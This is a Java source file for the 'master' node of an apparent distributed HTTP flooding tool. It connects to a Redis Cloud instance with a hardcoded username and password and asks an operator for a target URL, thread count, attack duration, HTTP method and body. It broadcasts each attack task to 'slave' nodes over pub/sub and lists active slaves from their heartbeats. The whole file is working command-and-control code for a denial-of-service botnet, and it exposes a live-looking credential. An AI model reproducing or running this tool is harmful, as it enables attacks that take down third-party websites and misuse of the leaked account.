package dev.mrflyn.redstorm_master;

import com.google.gson.JsonObject;
import redis.clients.jedis.*;

import java.util.Scanner;
import java.util.Set;

public class Main {

    private static final String TASK_CHANNEL = "http-tasks";
    private static final long SLAVE_TIMEOUT = 10000;

    public static void main(String[] args) {
        JedisClientConfig config = DefaultJedisClientConfig.builder()
                .user("default")
                .password("AzkFfCcv7tgfmnrwo9jGG7NO1gbfjdJl")
                .build();


        try (UnifiedJedis jedis = new UnifiedJedis(
                new HostAndPort("redis-11699.c212.ap-south-1-1.ec2.redns.redis-cloud.com", 11699),
                config)) {
            Scanner scanner = new Scanner(System.in);
            new HeartBeatListener(3000, jedis).start();
            System.out.println("Master Node Started! Publishing tasks to slaves...");

            while (true) {
                String command = scanner.nextLine().trim().toLowerCase();
                if ("slaves".equals(command)) {
                    displayActiveSlaves(jedis);
                } else if ("exit".equals(command)) {
                    break;
                } else {
                    System.out.println("Enter target URL (or 'exit' to quit): ");
                    String target = scanner.nextLine();
                    if ("exit".equalsIgnoreCase(target)) break;

                    System.out.println("Enter number of threads: ");
                    String threads = scanner.nextLine();

                    System.out.println("Enter duration of attack (in seconds): ");
                    String duration = scanner.nextLine();

                    System.out.println("Enter HTTP method (GET/POST/PUT/DELETE): ");
                    String method = scanner.nextLine().toUpperCase();

                    System.out.println("Enter request body (or leave blank for none): ");
                    String body = scanner.nextLine();

                    JsonObject task = new JsonObject();
                    task.addProperty("target", target);
                    task.addProperty("method", method);
                    task.addProperty("threads", Integer.parseInt(threads));
                    task.addProperty("duration", Integer.parseInt(duration));
                    if (!body.isEmpty())
                        task.addProperty("body", body);

                    System.out.println("Publishing task to slaves...");
                    jedis.publish(TASK_CHANNEL, task.toString());
                }
            }
        }
    }

    private static void displayActiveSlaves(UnifiedJedis jedis) {
        long currentTime = System.currentTimeMillis();
        Set<String> slaves = jedis.keys("slave:*");

        if (slaves.isEmpty()) {
            System.out.println("No active slaves.");
            return;
        }

        System.out.println("Active Slaves: "+ slaves.size());
        for (String slaveKey : slaves) {
            String lastSeenStr = jedis.get(slaveKey);
            if (lastSeenStr == null) continue;

            long lastSeen = Long.parseLong(lastSeenStr);
            if (currentTime - lastSeen < SLAVE_TIMEOUT) {
                System.out.println(" - " + slaveKey.replace("slave:", ""));
            } else {
                jedis.del(slaveKey);
            }
        }
    }
}